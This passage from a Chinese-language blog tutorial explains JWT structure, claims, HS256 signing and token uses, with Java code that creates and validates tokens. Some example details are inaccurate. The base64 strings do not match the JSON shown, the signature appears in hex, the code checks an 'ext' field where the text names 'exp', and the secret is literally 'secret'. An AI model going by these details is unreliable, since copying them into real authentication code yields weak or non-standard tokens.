  &quot;typ&quot;: &quot;JWT&quot;,
  &quot;alg&quot;: &quot;HS256&quot;
}
</code></pre>

<p>base64一下</p>

<p><code>ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9</code></p>

<ul>
<li>payload</li>
</ul>

<p>标准文档：<a href="https://tools.ietf.org/html/draft-ietf-oauth-json-web-token-32#section-4.1">https://tools.ietf.org/html/draft-ietf-oauth-json-web-token-32#section-4.1</a></p>

<p>可以在其中添加这些字段</p>

<pre><code class="language-text">iss：Issuer，发行者
sub：Subject，主题
aud：Audience，观众
exp：Expiration time，过期时间
nbf：Not before
iat：Issued at，发行时间
jti：JWT ID
</code></pre>

<pre><code class="language-java">Map&lt;String , Object&gt; payload=new HashMap&lt;String, Object&gt;();
Date date=new Date();
payload.put(&quot;uid&quot;, &quot;007&quot;);
payload.put(&quot;iat&quot;, date.getTime());
payload.put(&quot;ext&quot;,date.getTime()+1000*60*60);
</code></pre>

<p>上边代码中添加的字段如下</p>

<pre><code class="language-javascript">{
    &quot;iat&quot;: 当前时间,
    &quot;exp&quot;: 过期时间,
    &quot;uid&quot;: &quot;007&quot;
}
</code></pre>

<p>base64编码</p>

<p><code>ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==</code></p>

<p>这样payload就生成好了</p>

<ul>
<li>signature</li>
</ul>

<p>将header和payload生成的base64编码通过<code>.</code>连接起来，如下</p>

<p><code>ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9.ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==</code></p>

<p>然后再定义一个secret，如下</p>

<p><code>secret</code></p>

<p>通过header中定义的HS256算法以secret为密钥进行加密得到signature</p>

<p><code>81faa5ef7b7596783cb3ed2f75618def367a9b7f8490047cb12880d895b794eb</code></p>

<p>此时JWT就生成了，base64(header).base64(payload) .signature</p>

<p>像这样<code>ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9.ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==.81faa5ef7b7596783cb3ed2f75618def367a9b7f8490047cb12880d895b794eb</code></p>

<p>当然这种方式不能在token中携带敏感信息，例如密码</p>

<h4 id="toc_3">0x04 应用</h4>

<ul>
<li>单点登陆</li>
</ul>

<p><code>Set-Cookie: jwt=yyy.zzz.xxx; HttpOnly; max-age=980000; domain=.taobao.com</code></p>

<ul>
<li>API 调用/授权</li>
</ul>

<p><code>https://api.weixin.qq.com/cgi-bin/component/api_query_auth?component_access_token=xxxx</code></p>

<ul>
<li><p>支付验证（一次性）</p></li>
<li><p>串行服务调用</p>
<p>一次性有效，再次生成token时以用户账户和第一次token为key，update该记录来判断</p></li>
<li><p>敏感接口多次调用</p></li>
</ul>

<h4 id="toc_4">0x05 代码</h4>

<p><strong>生成代码</strong></p>

<pre><code class="language-text">private static final JWSHeader header=new JWSHeader(JWSAlgorithm.HS256, JOSEObjectType.JWT, null, null, null, null, null, null, null, null, null, null, null);
    
    /**
     * 生成token，该方法只在用户登录成功后调用
     * 
     * @param Map集合，可以存储用户id，token生成时间，token过期时间等自定义字段
     * @return token字符串,若失败则返回null
     */
    public static String createToken(Map&lt;String, Object&gt; payload) {
        String tokenString=null;
        // 创建一个 JWS object
        JWSObject jwsObject = new JWSObject(header, new Payload(new JSONObject(payload)));
        try {
            // 将jwsObject 进行HMAC签名
            jwsObject.sign(new MACSigner(SECRET));
            tokenString=jwsObject.serialize();
        } catch (JOSEException e) {
            System.err.println(&quot;签名失败:&quot; + e.getMessage());
            e.printStackTrace();
        }
        return tokenString;
    }
</code></pre>

<p><strong>校验代码</strong></p>

<pre><code class="language-text">public static Map&lt;String, Object&gt; validToken(String token) {
        Map&lt;String, Object&gt; resultMap = new HashMap&lt;String, Object&gt;();
        try {
            JWSObject jwsObject = JWSObject.parse(token);
            Payload payload = jwsObject.getPayload();
            JWSVerifier verifier = new MACVerifier(SECRET);
            if (jwsObject.verify(verifier)) {
                JSONObject jsonOBj = payload.toJSONObject();
                // token校验成功（此时没有校验是否过期）
                resultMap.put(&quot;state&quot;, TokenState.VALID.toString());
                // 若payload包含ext字段，则校验是否过期
                if (jsonOBj.containsKey(&quot;ext&quot;)) {
                    long extTime = Long.valueOf(jsonOBj.get(&quot;ext&quot;).toString());
                    long curTime = new Date().getTime();
                    // 过期了
                    if (curTime &gt; extTime) {
                        resultMap.clear();
                        resultMap.put(&quot;state&quot;, TokenState.EXPIRED.toString());
                    }
                }
                resultMap.put(&quot;data&quot;, jsonOBj);
            } else {
                // 校验失败
                resultMap.put(&quot;state&quot;, TokenState.INVALID.toString());
            }
        } catch (Exception e) {
            //e.printStackTrace();
            // token格式不合法导致的异常
            resultMap.clear();
            resultMap.put(&quot;state&quot;, TokenState.INVALID.toString());
        }
        return resultMap;
    }   
</code></pre>

<p>参考：<br/>
<a href="http://blog.leapoahead.com/2015/09/06/understanding-jwt/">http://blog.leapoahead.com/2015/09/06/understanding-jwt/</a><br/>
<a href="https://github.com/bigmeow/JWT">https://github.com/bigmeow/JWT</a></p>

]]></content>
  </entry>
  
</feed>
